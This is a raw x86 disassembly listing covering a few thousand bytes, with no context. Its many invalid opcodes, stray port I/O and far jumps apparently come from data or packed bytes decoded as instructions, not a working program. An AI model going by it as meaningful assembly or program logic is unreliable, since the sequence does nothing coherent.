  407189:	xchg   DWORD PTR [edx+0x5182d3cd],esp
  40718f:	in     eax,0x15
  407191:	push   edi
  407192:	pushf  
  407193:	cvtps2pi mm2,QWORD PTR [eax+0xd]
  407197:	or     al,0xd9
  407199:	sbb    BYTE PTR [eax+esi*8],bl
  40719c:	adc    BYTE PTR [esi+0xd7ab4b2],ah
  4071a2:	std    
  4071a3:	push   edi
  4071a4:	fld    st(3)
  4071a6:	in     eax,0xd0
  4071a8:	rol    DWORD PTR ds:0x9e826c45,1
  4071ae:	(bad)  
  4071af:	fisubr WORD PTR [edx]
  4071b1:	es call 0x5cb1:0x71b2f269
  4071b9:	mov    dh,0x7b
  4071bb:	dec    eax
  4071bc:	lds    esi,FWORD PTR [edi+0x1e]
  4071bf:	ret    0x85c2
  4071c2:	add    eax,DWORD PTR [edx+edx*8]
  4071c5:	add    esp,ebx
  4071c7:	das    
  4071c8:	scas   al,BYTE PTR es:[edi]
  4071c9:	scas   eax,DWORD PTR es:[edi]
  4071ca:	mov    ebp,es
  4071cc:	les    edi,FWORD PTR [eax]
  4071ce:	(bad)  
  4071cf:	std    
  4071d0:	adc    al,0x8
  4071d2:	inc    ebp
  4071d3:	ins    DWORD PTR es:[edi],dx
  4071d4:	add    DWORD PTR [ecx-0x39eeda4f],ecx
  4071da:	or     edx,DWORD PTR [edx-0x48afe318]
  4071e0:	cwde   
  4071e1:	fisub  DWORD PTR [edx+0x6a]
  4071e4:	aad    0x8e
  4071e6:	outs   dx,BYTE PTR ds:[esi]
  4071e7:	scas   al,BYTE PTR es:[edi]
  4071e8:	inc    ecx
  4071e9:	add    edi,0xbb8ee6ca
  4071ef:	or     eax,0xaab9718f
  4071f4:	xchg   ebx,eax
  4071f5:	add    ebx,eax
  4071f7:	mov    ah,0xba
  4071f9:	jp     0x407277
  4071fb:	xchg   esi,eax
  4071fc:	test   eax,0xc62bf60e
  407201:	lods   al,BYTE PTR ds:[esi]
  407202:	or     al,0xd1
  407204:	push   eax
  407205:	outs   dx,BYTE PTR ds:[esi]
  407206:	std    
  407207:	mov    dh,0x41
  407209:	cmp    al,0xed
  40720b:	xchg   esi,eax
  40720c:	xor    edx,DWORD PTR [ebp-0x5ce9a484]
  407212:	int3   
  407213:	xor    cl,BYTE PTR [ecx]
  407215:	jno    0x4071e6
  407217:	sbb    DWORD PTR [esp+eiz*2-0x342fbed8],eax
  40721e:	js     0x4071df
  407220:	or     al,0x4
  407222:	int3   
  407223:	pop    edx
  407224:	mov    ebx,0xb5fa3c11
  407229:	rcr    DWORD PTR [edi+edx*8-0x701288c4],0xae
  407231:	call   0x33a4:0x70a1f5ac
  407238:	mov    edx,0x6645549c
  40723d:	mov    ds,ebx
  40723f:	test   eax,0x60fea548
  407244:	xlat   BYTE PTR ds:[ebx]
  407245:	inc    esi
  407246:	pop    esp
  407247:	mov    ss,edx
  407249:	test   BYTE PTR [ebx-0x30efd093],bh
  40724f:	dec    ebp
  407250:	rcl    DWORD PTR [ebx-0x331ce497],0xb0
  407257:	scas   eax,DWORD PTR es:[edi]
  407258:	mov    esp,0x349bdac1
  40725d:	add    BYTE PTR [edi],dl
  40725f:	fadd   st(0),st
  407261:	adc    al,0xc5
  407263:	sti    
  407264:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407265:	stc    
  407266:	sub    DWORD PTR [ecx-0x48],eax
  407269:	test   eax,0x8c189c0a
  40726e:	dec    ebx
  40726f:	lahf   
  407270:	inc    ebx
  407271:	sahf   
  407272:	mov    al,0x14
  407274:	and    eax,0x2c90d71
  407279:	stc    
  40727a:	sub    eax,0x534023da
  40727f:	je     0x407286
  407281:	imul   edx,DWORD PTR [eax+0x6e],0x6b6cd099
  407288:	fmul   QWORD PTR [ecx+0x62]
  40728b:	gs dec ecx
  40728d:	lock mov al,ds:0xcf93bc45
  407293:	adc    al,0x73
  407295:	push   0x9e014bea
  40729a:	xchg   ebp,eax
  40729b:	daa    
  40729c:	mov    cl,BYTE PTR [edx]
  40729e:	hlt    
  40729f:	jns    0xedea15d2
  4072a5:	jo     0x407239
  4072a7:	ds or  al,0x1d
  4072aa:	inc    esi
  4072ab:	adc    ch,BYTE PTR [eax+0x1958e843]
  4072b1:	ds push ds
  4072b3:	mov    eax,ds:0x6e563cab
  4072b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4072b9:	pop    edi
  4072ba:	push   ecx
  4072bb:	jbe    0x407254
  4072bd:	mov    ebp,0x4c0d5684
  4072c2:	push   es
  4072c3:	adc    BYTE PTR [ebp+0x179f7277],0x2b
  4072ca:	loopne 0x407317
  4072cc:	or     BYTE PTR [edi-0x79bfe2f4],0xbf
  4072d3:	es push esi
  4072d5:	mov    bl,BYTE PTR [eax]
  4072d7:	jl     0x407357
  4072d9:	mov    al,0xf2
  4072db:	pop    edi
  4072dc:	in     eax,0xe
  4072de:	cmp    eax,0x9c638711
  4072e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4072e4:	push   cs
  4072e5:	scas   al,BYTE PTR es:[edi]
  4072e6:	jle    0x407302
  4072e8:	dec    eax
  4072e9:	add    BYTE PTR [ebp+0x2be6ea9d],ah
  4072ef:	jle    0x407310
  4072f1:	repz push ss
  4072f3:	or     al,0x7d
  4072f5:	or     BYTE PTR [esi],0xf3
  4072f8:	fs popf 
  4072fa:	ficom  DWORD PTR [edi-0x9a03ed2]
  407300:	xchg   DWORD PTR [edx-0x38],ecx
  407303:	push   0x46
  407305:	mov    esp,0xa99c4f34
  40730a:	xchg   esp,eax
  40730b:	add    BYTE PTR [edx+ebx*1],dh
  40730e:	call   0xbacae4f6
  407313:	sub    DWORD PTR [edi-0x23f4b0fd],ecx
  407319:	xor    al,0xe8
  40731b:	xor    ch,BYTE PTR [ebx-0x2112c81e]
  407321:	cmp    BYTE PTR [ebp+0x1b8d48df],0xf0
  407328:	mov    eax,?
  40732a:	imul   esi,DWORD PTR ds:0xe8ce7c4a,0x2abd3eac
  407334:	push   es
  407335:	into   
  407336:	lds    ecx,FWORD PTR ds:0x48c0191b
  40733c:	sahf   
  40733d:	mov    esi,0x4e5a05f4
  407342:	imul   edi,DWORD PTR [eax-0x4c530d1a],0x2873fc5c
  40734c:	out    0xf1,eax
  40734e:	dec    ebx
  40734f:	push   es
  407350:	out    0x71,eax
  407352:	adc    BYTE PTR [edx],0x96
  407355:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  407357:	xchg   BYTE PTR [ecx-0x4b548c45],dh
  40735d:	aad    0x51
  40735f:	outs   dx,DWORD PTR ds:[esi]
  407360:	pop    ecx
  407361:	iret   
  407362:	scas   eax,DWORD PTR es:[edi]
  407363:	test   bh,dl
  407365:	xchg   ecx,eax
  407366:	mov    ds:0x1728b474,al
  40736b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40736c:	retf   0x129c
  40736f:	xor    DWORD PTR [eax+0x5c296d03],eax
  407375:	test   edi,ecx
  407377:	pop    ds
  407378:	mov    ah,0x51
  40737a:	cmp    edx,ebp
  40737c:	inc    edx
  40737d:	ds scas eax,DWORD PTR es:[edi]
  40737f:	ds dec esp
  407381:	cdq    
  407382:	les    eax,FWORD PTR [edi]
  407384:	jb     0x4073f3
  407386:	push   ebp
  407387:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407388:	out    dx,eax
  407389:	ret    
  40738a:	jle    0x407320
  40738c:	fst    st(7)
  40738e:	xchg   ch,cl
  407390:	ins    BYTE PTR es:[edi],dx
  407391:	sub    BYTE PTR [edx-0x58],ah
  407394:	jle    0x407371
  407396:	stos   BYTE PTR es:[edi],al
  407397:	popf   
  407398:	xchg   esp,eax
  407399:	jae    0x40740c
  40739b:	in     al,dx
  40739c:	mov    al,ds:0xd3ea2134
  4073a1:	xchg   esi,eax
  4073a2:	xchg   esp,eax
  4073a3:	mov    ch,BYTE PTR [edx]
  4073a5:	clc    
  4073a6:	and    eax,0x2f4fe69d
  4073ab:	add    BYTE PTR [eax+0x57],bh
  4073ae:	rcl    esi,1
  4073b0:	js     0x4073e9
  4073b2:	cmp    cl,ch
  4073b4:	call   0xaa4b6d11
  4073b9:	(bad)  
  4073ba:	xchg   edi,eax
  4073bb:	shr    ch,0x5e
  4073be:	loope  0x40740a
  4073c0:	stos   DWORD PTR es:[edi],eax
  4073c1:	loop   0x4073bd
  4073c3:	sbb    BYTE PTR [edi-0x78],0xa9
  4073c7:	dec    esi
  4073c8:	lahf   
  4073c9:	and    eax,0xa22bbcc7
  4073ce:	fstp   DWORD PTR [edx]
  4073d0:	xchg   ebp,eax
  4073d1:	scas   eax,DWORD PTR es:[edi]
  4073d2:	pop    eax
  4073d3:	into   
  4073d4:	outs   dx,BYTE PTR ds:[esi]
  4073d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4073d6:	(bad)  
  4073d7:	ror    DWORD PTR [eax],cl
  4073d9:	daa    
  4073da:	fiadd  WORD PTR [ebx+0x7c9fe8d]
  4073e0:	enter  0x5b69,0x6c
  4073e4:	jbe    0x4073aa
  4073e6:	mov    bl,0x22
  4073e8:	adc    al,0xf0
  4073ea:	sub    eax,0xd63b4bd3
  4073ef:	aad    0xe2
  4073f1:	mov    ecx,0x209ec204
  4073f6:	neg    BYTE PTR [edi-0x6c7536b6]
  4073fc:	jle    0x40738a
  4073fe:	in     eax,dx
  4073ff:	cmp    al,0xbe
  407401:	xor    al,0x2b
  407403:	jbe    0x4073a0
  407405:	into   
  407406:	mov    edx,0x533e4aee
  40740b:	scas   eax,DWORD PTR es:[edi]
  40740c:	mov    WORD PTR ss:[ecx+0x134b1803],ds
  407413:	sub    ch,dl
  407415:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407416:	loop   0x4073ef
  407418:	sub    ebx,0xe65ba0d7
  40741e:	test   DWORD PTR [eax+0x55],esp
  407421:	pop    edi
  407422:	or     eax,0xefa0ed39
  407427:	mov    cl,0xda
  407429:	mov    ds:0xec9e4650,eax
  40742e:	mov    WORD PTR [edx],?
  407430:	int3   
  407431:	add    edi,DWORD PTR [ebx-0x3a7a524c]
  407437:	fild   QWORD PTR [edx+0x7]
  40743a:	fnstsw WORD PTR [ecx]
  40743c:	xchg   edx,eax
  40743d:	icebp  
  40743e:	xchg   ebx,eax
  40743f:	inc    ebx
  407440:	add    BYTE PTR [edi+0x33409827],0xca
  407447:	add    DWORD PTR [edi],eax
  407449:	cdq    
  40744a:	and    eax,0x864562ff
  40744f:	mov    fs,WORD PTR [ebx-0x48]
  407452:	cli    
  407453:	mov    eax,0x487c1a3d
  407458:	mov    WORD PTR [ebx+0x1075cb31],?
  40745e:	xchg   esp,eax
  40745f:	xchg   esp,eax
  407460:	imul   eax,DWORD PTR [ecx-0x59],0xba907f02
  407467:	outs   dx,BYTE PTR ds:[esi]
  407468:	mov    WORD PTR [edi+eiz*2+0x14b76966],fs
  40746f:	aad    0x90
  407471:	fcmovu st,st(6)
  407473:	jne    0x4074da
  407475:	jge    0x4073f8
  407477:	out    0xc9,al
  407479:	fild   DWORD PTR [edx-0x48]
  40747c:	xchg   ebp,eax
  40747d:	jns    0x4074d5
  40747f:	ficomp WORD PTR [ebp-0xb]
  407482:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407483:	dec    edx
  407484:	fdivr  DWORD PTR [ebx+0x6d]
  407487:	cmp    DWORD PTR [ecx],0x65c93dbb
  40748d:	mov    esp,0xbc9c0b8a
  407492:	add    BYTE PTR [eax],bh
  407494:	mov    ds:0x91d6954a,al
  407499:	in     eax,dx
  40749a:	push   ds
  40749b:	adc    bh,dl
  40749d:	(bad)  
  40749e:	call   0x5316899b
  4074a3:	(bad)  [ebp+0xebfe8f1]
  4074a9:	dec    esp
  4074aa:	dec    esi
  4074ab:	push   eax
  4074ac:	loop   0x40743b
  4074ae:	rol    DWORD PTR [edx+ebp*2-0x48],0xce
  4074b3:	jne    0x4074a7
  4074b5:	xchg   ebp,eax
  4074b6:	dec    eax
  4074b7:	loopne 0x4074b6
  4074b9:	sub    cl,BYTE PTR [esi]
  4074bb:	mov    cl,0x34
  4074bd:	sub    bl,al
  4074bf:	mov    ah,0x33
  4074c1:	fisub  DWORD PTR [ebx]
  4074c3:	mov    eax,ds:0xc99fe866
  4074c8:	add    eax,0xf390bf5a
  4074cd:	ffreep st(5)
  4074cf:	push   es
  4074d0:	push   0xffffffd9
  4074d2:	mov    ch,BYTE PTR [esi]
  4074d4:	push   ecx
  4074d5:	mov    ds:0xb8d7c431,eax
  4074da:	aas    
  4074db:	sbb    BYTE PTR [ebx+eiz*1],dh
  4074de:	push   ebx
  4074df:	ins    DWORD PTR es:[edi],dx
  4074e0:	outs   dx,DWORD PTR ds:[esi]
  4074e1:	int    0x2c
  4074e3:	xlat   BYTE PTR ds:[ebx]
  4074e4:	aas    
  4074e5:	pop    edx
  4074e6:	sbb    ah,BYTE PTR [ecx-0x45]
  4074e9:	sahf   
  4074ea:	pop    edi
  4074eb:	mov    BYTE PTR [edx-0x2639e239],0x84
  4074f2:	and    esp,edx
  4074f4:	js     0x407501
  4074f6:	icebp  
  4074f7:	aas    
  4074f8:	bnd jb 0x40753e
  4074fb:	mov    ecx,DWORD PTR [ebx]
  4074fd:	xlat   BYTE PTR ds:[ebx]
  4074fe:	dec    ebp
  4074ff:	push   ebp
  407500:	cs add al,0xd2
  407503:	cmp    eax,0x283eb12e
  407508:	xchg   esp,eax
  407509:	jbe    0x407564
  40750b:	je     0x40757a
  40750d:	xchg   edi,eax
  40750e:	inc    edi
  40750f:	cdq    
  407510:	mov    DWORD PTR [ebp-0x6],esp
  407513:	repnz adc al,0x26
  407516:	(bad)  
  407517:	xchg   ebp,eax
  407518:	jmp    0x6f11a9e5
  40751d:	adc    edx,ebp
  40751f:	inc    eax
  407520:	icebp  
  407521:	xchg   DWORD PTR [esp+ebx*1+0x15],esi
  407525:	in     eax,dx
  407526:	nop
  407527:	xor    cl,BYTE PTR [edi-0x36]
  40752a:	mov    ecx,0x5b8186e9
  40752f:	aad    0x78
  407531:	xor    BYTE PTR [edx+eiz*4-0x681616dd],bl
  407538:	sub    dh,BYTE PTR [eax-0x1426b593]
  40753e:	lods   al,BYTE PTR ds:[esi]
  40753f:	test   al,0x79
  407541:	jecxz  0x4074c7
  407543:	es stc 
  407545:	test   al,0x1e
  407547:	jge    0x4074d9
  407549:	jg     0x407558
  40754b:	push   eax
  40754c:	dec    edx
  40754d:	xor    bh,BYTE PTR [ebx+0x854a141]
  407553:	jnp    0x4075a6
  407555:	in     al,0xa5
  407557:	mov    ebx,DWORD PTR [eax+eiz*2-0x3cfcff63]
  40755e:	ret    0x95d3
  407561:	outs   dx,DWORD PTR ds:[esi]
  407562:	sti    
  407563:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407564:	fimul  DWORD PTR [ebx]
  407566:	shr    DWORD PTR [ecx+0xeb29d88],1
  40756c:	mov    ecx,0xdf2d746e
  407571:	loop   0x4075d7
  407573:	arpl   WORD PTR [esi+0x7736af1c],ax
  407579:	jne    0x407558
  40757b:	sbb    eax,0x42a33e70
  407580:	add    al,0xcb
  407582:	mov    ecx,0xbc91d38e
  407587:	(bad)  
  407588:	call   0x2dd0c165
  40758d:	jo     0x40756e
  40758f:	mov    bl,0x47
  407591:	push   esi
  407592:	mov    esi,0x40752ec1
  407597:	mov    dh,0x89
  407599:	aad    0xff
  40759b:	pushf  
  40759c:	out    dx,eax
  40759d:	nop
  40759e:	add    ch,BYTE PTR [ebx+eiz*8+0x2f]
  4075a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4075a3:	pop    eax
  4075a4:	jae    0x4075e1
  4075a6:	aas    
  4075a7:	enter  0x9f89,0x80
  4075ab:	sbb    BYTE PTR [esi-0x48dcddc3],dl
  4075b1:	cli    
  4075b2:	out    0x7c,eax
  4075b4:	cdq    
  4075b5:	push   ebx
  4075b6:	sub    eax,0x83831611
  4075bb:	lock pop edi
  4075bd:	or     BYTE PTR [edi-0xe],al
  4075c0:	jge    0x4075b5
  4075c2:	jl     0x407553
  4075c4:	and    eax,0x846ea161
  4075c9:	sub    bl,0x47
  4075cc:	sbb    dl,BYTE PTR [ecx-0x53]
  4075cf:	bound  edi,QWORD PTR [edi+esi*8]
  4075d2:	and    BYTE PTR [eax],dh
  4075d4:	int3   
  4075d5:	addr16 cmp al,0xe3
  4075d8:	test   al,0xf6
  4075da:	or     al,0x2
  4075dc:	in     eax,dx
  4075dd:	jno    0x4075be
  4075df:	retf   0x411e
  4075e2:	mov    BYTE PTR [eax-0x4eb39d2d],dh
  4075e8:	xchg   ebp,eax
  4075e9:	mov    bl,0x4e
  4075eb:	mov    cl,0x66
  4075ed:	pushf  
  4075ee:	bnd jae 0x4075e8
  4075f1:	sub    al,0xad
  4075f3:	dec    ecx
  4075f4:	sbb    al,0x81
  4075f6:	stc    
  4075f7:	sahf   
  4075f8:	aas    
  4075f9:	pop    eax
  4075fa:	pop    ecx
  4075fb:	ins    DWORD PTR es:[edi],dx
  4075fc:	shl    BYTE PTR cs:[eax+0x6],cl
  407600:	ret    0x5c9
  407603:	or     ch,dh
  407605:	add    dh,BYTE PTR [edx]
  407607:	dec    edi
  407608:	sub    eax,0x5bc4c859
  40760d:	test   BYTE PTR [edx],bh
  40760f:	and    bh,BYTE PTR [ecx+0x26ce9724]
  407615:	scas   al,BYTE PTR es:[edi]
  407616:	(bad)  
  407618:	repnz ds fdivrp st(0),st
  40761c:	je     0x40762f
  40761e:	mov    ebx,0x65b08ac5
  407623:	ret    0x39dd
  407626:	nop
  407627:	pushf  
  407628:	mov    ah,0xba
  40762a:	sbb    al,0x4d
  40762c:	inc    edx
  40762d:	jmp    0x407618
  40762f:	lods   al,BYTE PTR ds:[esi]
  407630:	xchg   BYTE PTR [eax+0x45],al
  407633:	cli    
  407634:	jge    0x407616
  407636:	inc    ebp
  407637:	xor    BYTE PTR [ebx+0x677a5041],al
  40763d:	pop    edi
  40763e:	not    DWORD PTR [esp+esi*2+0xdf7f678]
  407645:	mov    ?,WORD PTR [esi-0x45]
  407648:	ret    
  407649:	or     al,0x81
  40764b:	popa   
  40764c:	cs out 0x80,al
  40764f:	jno    0x407609
  407651:	dec    esi
  407652:	data16 or al,BYTE PTR [esi-0x67]
  407656:	xor    eax,0x611cdbc6
  40765b:	in     eax,0x4c
  40765d:	pop    eax
  40765e:	dec    ebp
  40765f:	hlt    
  407660:	imul   esi,DWORD PTR [ebx+edx*2-0x667a3276],0x67965bbf
  40766b:	pop    edx
  40766c:	push   esi
  40766d:	out    dx,eax
  40766e:	push   cs
  40766f:	and    bh,BYTE PTR [esi]
  407671:	jnp    0x4076c5
  407673:	sub    eax,0xac43c34a
  407678:	add    BYTE PTR [eax-0x39],bl
  40767b:	pop    esi
  40767c:	bound  eax,QWORD PTR cs:[ecx-0x5ed5e3bb]
  407683:	repz dec edi
  407685:	(bad)  
  407687:	ror    esi,1
  407689:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40768a:	adc    ecx,DWORD PTR [ecx]
  40768c:	adc    eax,0xea778c4f
  407691:	mov    esp,0x3b501796
  407696:	push   ebp
  407697:	mov    bl,0x42
  407699:	arpl   WORD PTR [ebx+0x2d],bx
  40769c:	ja     0x4076e0
  40769e:	imul   eax,ebx,0x9
  4076a1:	jno    0x407673
  4076a3:	(bad)  
  4076a4:	and    edi,ecx
  4076a6:	rcr    BYTE PTR [ecx+0x6c],cl
  4076a9:	addr16 push 0xffffffb0
  4076ac:	(bad)  
  4076ad:	push   edi
  4076ae:	cmc    
  4076af:	(bad)  
  4076b0:	jb     0x407705
  4076b2:	mov    eax,ds:0x9ed7f214
  4076b7:	mov    DWORD PTR [ecx],esi
  4076b9:	push   ecx
  4076ba:	sbb    BYTE PTR [ebx+0x67820e0b],bh
  4076c0:	and    ebx,ecx
  4076c2:	sub    eax,0x81a1e59f
  4076c7:	into   
  4076c8:	mov    bh,0xd7
  4076ca:	imul   esi,edi,0x35
  4076cd:	adc    bl,dl
  4076cf:	imul   eax,DWORD PTR [eax+0x5b],0x6417a09c
  4076d6:	sahf   
  4076d7:	outs   dx,BYTE PTR ds:[esi]
  4076d8:	jp     0x407733
  4076da:	xchg   edx,eax
  4076db:	and    eax,DWORD PTR gs:[eax+0x6cff416]
  4076e2:	rcl    WORD PTR [edx+esi*8-0x48c61558],1
  4076ea:	or     eax,0xc5e34bf9
  4076ef:	out    0xc4,al
  4076f1:	dec    ebp
  4076f2:	test   BYTE PTR [edx-0x18],bh
  4076f5:	clc    
  4076f6:	add    ebx,ebx
  4076f8:	stos   DWORD PTR es:[edi],eax
  4076f9:	pop    es
  4076fa:	aam    0x6f
  4076fc:	xchg   ebp,eax
  4076fd:	sbb    ebp,edi
  4076ff:	push   edi
  407700:	lock mov ah,0x57
  407703:	mov    edx,0x712d6f1b
  407708:	pop    ss
  407709:	add    al,0x98
  40770b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40770c:	outs   dx,DWORD PTR ds:[esi]
  40770d:	sahf   
  40770e:	mov    ds:0xc373bece,eax
  407713:	jge    0x407715
  407715:	pusha  
  407716:	cwde   
  407717:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407718:	mul    DWORD PTR [esi]
  40771a:	and    DWORD PTR [ebp+0x3d],esp
  40771d:	xchg   esp,eax
  40771e:	push   ebx
  40771f:	loop   0x407708
  407721:	sbb    eax,0xd5ba808e
  407726:	xchg   edi,eax
  407727:	ror    DWORD PTR [edi-0x6],1
  40772a:	cwde   
  40772b:	push   cs
  40772c:	xchg   ecx,eax
  40772d:	adc    bh,BYTE PTR [eax-0x43aef352]
  407733:	and    ah,BYTE PTR [ecx]
  407735:	pop    ecx
  407736:	cmp    al,0x60
  407738:	pop    esi
  407739:	mov    bl,0xda
  40773b:	or     al,0x13
  40773d:	(bad)  [edx-0x36]
  407740:	aaa    
  407741:	cld    
  407742:	add    edx,esi
  407744:	xor    DWORD PTR [eax-0x4a250471],ebx
  40774a:	jmp    0xe257f086
  40774f:	mov    cl,0xf4
  407751:	mov    cl,0x90
  407753:	xor    bl,0x69
  407756:	es pushf 
  407758:	das    
  407759:	sub    DWORD PTR [ecx+ebp*1],esi
  40775c:	rcl    BYTE PTR [esi+0x675c2b56],cl
  407762:	pop    es
  407763:	and    BYTE PTR [eax],0xec
  407766:	xchg   ecx,eax
  407767:	adc    BYTE PTR [edx-0x478a9003],cl
  40776d:	sub    eax,0x712aa4d2
  407772:	loope  0x40778c
  407774:	sbb    al,0xe3
  407776:	cmp    al,0xdb
  407778:	push   es
  407779:	(bad)  
  40777a:	cmp    ecx,ebp
  40777c:	inc    ebx
  40777d:	inc    ecx
  40777e:	imul   esi,ecx,0x99e09b2e
  407784:	or     eax,0x40c2e495
  407789:	scas   eax,DWORD PTR es:[edi]
  40778a:	or     DWORD PTR [esi-0x70],eax
  40778d:	pop    eax
  40778e:	bound  edx,QWORD PTR [edx]
  407790:	dec    edx
  407791:	aas    
  407792:	enter  0x3d82,0xfa
  407796:	fstp   DWORD PTR [ecx-0x4367dcf1]
  40779c:	cwde   
  40779d:	cmp    ah,al
  40779f:	jecxz  0x407745
  4077a1:	inc    ebx
  4077a2:	sbb    eax,0xa5f5a01a
  4077a7:	out    dx,eax
  4077a8:	or     al,0xeb
  4077aa:	adc    BYTE PTR [ecx],dl
  4077ac:	ins    DWORD PTR es:[edi],dx
  4077ad:	inc    ecx
  4077ae:	xor    eax,DWORD PTR [esi+0x2d]
  4077b1:	pop    eax
  4077b2:	rdpmc  
  4077b4:	jg     0x407788
  4077b6:	pusha  
  4077b7:	arpl   WORD PTR ds:[ebx+0xf],di
  4077bb:	ins    DWORD PTR es:[edi],dx
  4077bc:	mov    BYTE PTR [edi],bh
  4077be:	push   edi
  4077bf:	mov    edi,0xef5933cb
  4077c4:	repz (bad) [eax]
  4077c7:	xchg   ecx,eax
  4077c8:	aad    0x22
  4077ca:	mov    BYTE PTR [ebp-0x10195345],ah
  4077d0:	aad    0x71
  4077d2:	pop    esp
  4077d3:	sbb    BYTE PTR [eax+0x3d2212e8],0xa3
  4077da:	add    ebp,eax
  4077dc:	xor    BYTE PTR [esi],ah
  4077de:	leave  
  4077df:	xchg   edi,eax
  4077e0:	mov    ecx,0xb67a3806
  4077e5:	xchg   esi,eax
  4077e6:	inc    ecx
  4077e7:	sub    al,0x7d
  4077e9:	xchg   edx,eax
  4077ea:	inc    edx
  4077eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4077ec:	push   esp
  4077ed:	inc    ebp
  4077ee:	mov    edx,es
  4077f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4077f1:	dec    eax
  4077f2:	xchg   ebp,eax
  4077f3:	out    0x22,al
  4077f5:	stos   BYTE PTR es:[edi],al
  4077f6:	lods   al,BYTE PTR ds:[esi]
  4077f7:	pushf  
  4077f8:	cmp    al,0x19
  4077fa:	scas   eax,DWORD PTR es:[edi]
  4077fb:	cmp    DWORD PTR [esi+0x2ce3ea5b],edx
  407801:	dec    ebp
  407802:	sbb    ah,BYTE PTR [edx]
  407804:	fidiv  DWORD PTR [edx]
  407806:	(bad)  
  407807:	arpl   ax,si
  407809:	xor    eax,0xd00c358d
  40780e:	je     0x4077e8
  407810:	mov    dl,0xc
  407812:	dec    ebx
  407813:	test   BYTE PTR [esi],dl
  407815:	or     bl,al
  407817:	lods   al,BYTE PTR ds:[esi]
  407818:	add    DWORD PTR [ebx+0x8],esi
  40781b:	dec    esp
  40781c:	pusha  
  40781d:	aad    0xaa
  40781f:	jb     0x407875
  407821:	mov    eax,esp
  407823:	mov    DWORD PTR [eax],edi
  407825:	push   ecx
  407826:	cmp    al,0x83
  407828:	push   ebp
  407829:	into   
  40782a:	scas   eax,DWORD PTR es:[edi]
  40782b:	or     DWORD PTR [ebx+edi*2],0xffffff95
  40782f:	js     0x407808
  407831:	jne    0x4077dc
  407833:	dec    eax
  407834:	mov    ds:0xba70d131,eax
  407839:	mov    dh,0xe
  40783b:	add    cl,BYTE PTR [ecx-0x7]
  40783e:	clc    
  40783f:	mov    ch,0x7b
  407841:	dec    ebx
  407842:	jmp    0x2aa1:0x292470ac
  407849:	cmp    eax,0x9992fbaf
  40784e:	(bad)  
  40784f:	cmp    esp,ecx
  407851:	inc    ecx
  407852:	arpl   WORD PTR [ecx+edx*2+0x26],cx
  407856:	push   edi
  407857:	xor    BYTE PTR [eax+edi*1-0x5f3ec34],dh
  40785e:	and    edi,ecx
  407860:	xor    DWORD PTR [eax-0x42],0xa0cf9e9e
  407867:	outs   dx,BYTE PTR ds:[esi]
  407868:	add    bh,dl
  40786a:	push   cs
  40786b:	loopne 0x4077f1
  40786d:	daa    
  40786e:	sbb    eax,0xbf38a5f2
  407873:	das    
  407874:	or     al,0x64
  407876:	add    esp,DWORD PTR [eax+esi*4-0x419fb856]
  40787d:	jb     0x407894
  40787f:	ins    BYTE PTR es:[edi],dx
  407880:	dec    esi
  407881:	pop    edx
  407882:	mov    edi,0xca65b32e
  407887:	shl    BYTE PTR [edi+edi*4-0x658ae3b2],cl
  40788e:	repnz mov ecx,0x58faaf23
  407894:	sub    al,0x97
  407896:	imul   esp,DWORD PTR [edi],0x5cb066ce
  40789c:	(bad)  
  40789d:	sbb    ebp,edx
  40789f:	inc    edi
  4078a0:	loop   0x407837
  4078a2:	push   ebp
  4078a3:	cmp    eax,0x1b07753c
  4078a8:	(bad)  
  4078a9:	sub    al,cl
  4078ab:	ins    DWORD PTR es:[edi],dx
  4078ac:	push   ebx
  4078ad:	(bad)  
  4078ae:	sbb    al,0xaf
  4078b0:	aad    0xba
  4078b2:	js     0x407910
  4078b4:	mov    edi,0x96c65444
  4078b9:	sbb    al,0xf2
  4078bb:	popfw  
  4078bd:	push   edi
  4078be:	mov    ecx,0xe106097a
  4078c3:	mov    ?,WORD PTR [ecx]
  4078c5:	cmp    eax,0x6c0702e0
  4078ca:	jmp    0x407937
  4078cc:	sub    al,0x50
  4078ce:	or     al,0x4f
  4078d0:	sub    eax,0x1cda05d8
  4078d5:	sub    BYTE PTR fs:[edx+0x557acee6],bl
  4078dc:	lds    ecx,FWORD PTR [ecx-0x24]
  4078df:	mov    esi,0x2376737b
  4078e4:	into   
  4078e5:	jno    0x40790e
  4078e7:	mov    WORD PTR [edi-0x13],ds
  4078ea:	jne    0x407898
  4078ec:	test   al,0x4d
  4078ee:	xchg   ecx,eax
  4078ef:	call   0xc0c55c41
  4078f4:	push   ecx
  4078f5:	in     eax,0xb
  4078f7:	clc    
  4078f8:	mov    edx,0xf0eeb284
  4078fd:	pop    ss
  4078fe:	push   edx
  4078ff:	sbb    BYTE PTR [eax+edx*8-0x5c],bh
  407903:	lds    edi,FWORD PTR [esp+eiz*2+0x213d348b]
  40790a:	inc    eax
  40790b:	inc    ebx
  40790c:	aaa    
  40790d:	pushf  
  40790e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40790f:	cmp    eax,0x8d2b9e40
  407914:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407915:	add    ebx,DWORD PTR ds:0x4703390b
  40791b:	aas    
  40791c:	dec    ebx
  40791d:	xor    al,0xf
  40791f:	fsubr  DWORD PTR [esi-0x19]
  407922:	and    al,0x33
  407924:	je     0x4078c5
  407926:	ss repnz cmc 
  407929:	lds    esp,FWORD PTR [ecx]
  40792b:	xchg   edi,eax
  40792c:	arpl   WORD PTR [esi+edi*4],bp
  40792f:	add    eax,DWORD PTR [ebx]
  407931:	mov    eax,ds:0xe2190b06
  407936:	inc    edx
  407937:	mov    al,0x4
  407939:	fwait
